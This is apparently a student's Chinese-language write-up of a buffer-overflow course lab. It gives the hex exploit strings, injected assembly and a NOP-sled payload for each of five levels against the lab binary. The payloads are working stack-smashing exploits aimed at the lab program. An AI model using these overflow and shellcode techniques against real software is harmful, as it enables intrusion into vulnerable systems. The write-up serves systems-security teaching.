# Solution

## 0 Candle

本题要求`getbuf()`返回后执行`smoke()`，只需覆盖掉`test()`栈帧内的`getbuf()`返回地址即可

1. 找到`getbuf()`代码

   ![image-20221107164146220](C:\Users\rjw2002\AppData\Roaming\Typora\typora-user-images\image-20221107164146220.png)

2. 画出栈帧图

   ![image-20221112102650173](C:\Users\rjw2002\AppData\Roaming\Typora\typora-user-images\image-20221112102650173.png)

3. 发现要覆盖44个byte后才到达返回地址位置，接下来将返回地址替换为`smoke`地址

![image-20221107164300868](C:\Users\rjw2002\AppData\Roaming\Typora\typora-user-images\image-20221107164300868.png)

**结论：**最终将要写入的是44个任意无用值加上4个地址

```
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 04 8b 04 08
```



## Sparkler

本题要求`getbuf()`返回后执行`fizz()`，同时修改参数`val`，只需覆盖掉`test()`栈帧内的`getbuf()`返回地址， 同时修改参数即可

1. `getbuf()`上题已获取代码，先找到fizz代码

   ![image-20221107165643916](C:\Users\rjw2002\AppData\Roaming\Typora\typora-user-images\image-20221107165643916.png)

2. 画出栈帧

   ![image-20221112103353680](C:\Users\rjw2002\AppData\Roaming\Typora\typora-user-images\image-20221112103353680.png)

3. 变量就在返回地址之上。**此处由于非正常的函数调用，getbuf()返回地址被覆盖后又被弹入eip，但fizz（）没有call指令，导致fizz栈帧中认为的val的位置实际上在test栈帧中还要再多4个字节**

**结论：**44个无用值+fizz地址+4个无用值+cookie值

```
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 2e 8b 04 08 00 00 00 00 4e b1 13 6f
```



## Firecracker

本题要求`getbuf()`返回后执行`bang()`，同时修改参数`global_value`。改变执行函数只需覆盖掉`test()`栈帧内的`getbuf()`返回地址， 但修改全局变量显然不是覆盖栈中某个位置的问题，需要插入自己的代码让函数执行。

因此本题思路是写一段自己的代码让函数执行，执行的方法便是将`getbuf()`返回地址修改为自己代码的地址。而我们自己的代码在`getbuf`时存在了`buf`数组中，因此核心问题是找到`buf`的地址

1. 看`bang()`代码获取地址，并且发现全局变量的位置在0x804e10c

   ![image-20221107171551028](C:\Users\rjw2002\AppData\Roaming\Typora\typora-user-images\image-20221107171551028.png)

2. 写出汇编代码

```
movl $0x6f13b14e, 0x804e10c		//将cookie写入全局变量位置
push $0x08048b82				//将bang地址压入栈然后ret直接到eip中
ret
```

3. 解析为机器码

```
00000000 <.text>:
   0:	c7 05 0c e1 04 08 4e 	movl   $0x6f13b14e,0x804e10c
   7:	b1 13 6f 
   a:	68 82 8b 04 08       	push   $0x8048b82
   f:	c3                   	ret    
```

4. gdb找到buf位置，用其替换`getbuf()`的返回地址

![image-20221107185539456](C:\Users\rjw2002\AppData\Roaming\Typora\typora-user-images\image-20221107185539456.png)

**结论：**自己写的代码+一些无用值+buf地址

```
c7 05 0c e1 04 08 4e b1 13 6f 68 82 8b 04 08 c3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 18 3b 68 55
```



## Dynamite

本题要求将`val`改成`cookie`并且不影响`test()`其他的执行

由于要重写`getbuf()`返回地址，`test()`栈帧的`ebp`必然会被修改，因此要保存旧ebp的值

1. 观察test代码，修改全局变量实际上只需要修改eax的值

   ![image-20221112110248211](C:\Users\rjw2002\AppData\Roaming\Typora\typora-user-images\image-20221112110248211.png)

2. gdb找到旧ebp的值

   ![image-20221107201117154](C:\Users\rjw2002\AppData\Roaming\Typora\typora-user-images\image-20221107201117154.png)

3. 写汇编代码

```
mov $0x6f13b14e, %eax		//写入cookie
mov $0x55683b70, %ebp		//保存旧ebp
push $0x8048bf3				//test中下一个指令的地址
ret
```

4. 转为机器码

```
00000000 <.text>:
   0:	b8 4e b1 13 6f       	mov    $0x6f13b14e,%eax
   5:	bd 70 3b 68 55       	mov    $0x55683b70,%ebp
   a:	68 f3 8b 04 08       	push   $0x8048bf3
   f:	c3                   	ret    
```

**结论：**自己的代码+一些无用值+ebp不修改+buf地址

```
b8 4e b1 13 6f bd 70 3b 68 55 68 f3 8b 04 08 c3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 70 3b 68 55 18 3b 68 55
```



## Nitroglycerin

本题采用了栈随机化的设置，我们无法获取到准确的buf的位置

1. 观察`getbufn()`代码，buf的地址始终在ebp-208。buf到ret之间有524个字节

   ![image-20221107212208468](C:\Users\rjw2002\AppData\Roaming\Typora\typora-user-images\image-20221107212208468.png)

2. gdb获取5次ebp的值，最大在0x55683be0，-208获取buf

   ![image-20221112111726522](C:\Users\rjw2002\AppData\Roaming\Typora\typora-user-images\image-20221112111726522.png)

> 为什么取最大地址？
>
> 我们的代码必然是前面一大串nop，后面才是有效的代码。
>
> 假设我们取的是介于最大和最小中间的一个地址，记为p。若实际地址比p小，这时我们访问到的是nop；若实际地址比p大，这时我们访问不到我们的代码。
>
> 因此必须取最大地址，保证任何时候实际地址都比我们小或相等

3. 类似上一题，存eax，ebp以及下一条指令地址

![image-20221107212147608](C:\Users\rjw2002\AppData\Roaming\Typora\typora-user-images\image-20221107212147608.png)

```
mov $0x6f13b14e, %eax
lea 0x28(%esp), %ebp	//ebp虽然变化，但与esp有固定关系
push $0x8048c67
ret
```

```
00000000 <.text>:
   0:	b8 4e b1 13 6f       	mov    $0x6f13b14e,%eax
   5:	8d 6c 24 28          	lea    0x28(%esp),%ebp
   9:	68 67 8c 04 08       	push   $0x8048c67
   e:	c3                   	ret    
```

**结论：**一大串nop+自己的代码+最大的buf地址

```
90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 
b8 4e b1 13 6f 
8d 6c 24 28 
68 67 8c 04 08 
c3 
a8 39 68 55 
```



# 感想收获

+ 实验后对程序运行时的堆栈结构有了更深的了解
+ 攻击程序手段多样，且十分有趣
